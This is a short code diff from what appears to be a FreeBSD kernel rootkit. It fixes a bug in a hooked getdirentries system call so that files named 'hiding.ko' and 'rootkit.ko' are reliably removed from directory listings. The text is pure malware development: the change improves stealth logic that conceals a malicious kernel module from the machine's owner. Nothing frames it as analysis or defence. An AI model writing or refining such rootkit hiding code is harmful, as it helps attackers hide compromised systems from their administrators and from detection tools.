@@ -73,7 +73,7 @@ static int getdirentries_hook(struct thread *td, void *syscall_args) {
             count -= curr_rec->d_reclen;
             // Add more module to hide here
             if (strcmp(curr_rec->d_name, "hiding.ko") == 0 
-                || strcmp(curr_rec->d_name, "rootkit.ko")
+                || strcmp(curr_rec->d_name, "rootkit.ko") == 0
             ) {
                 if (count != 0) {
                     memmove((char *) curr_rec, 
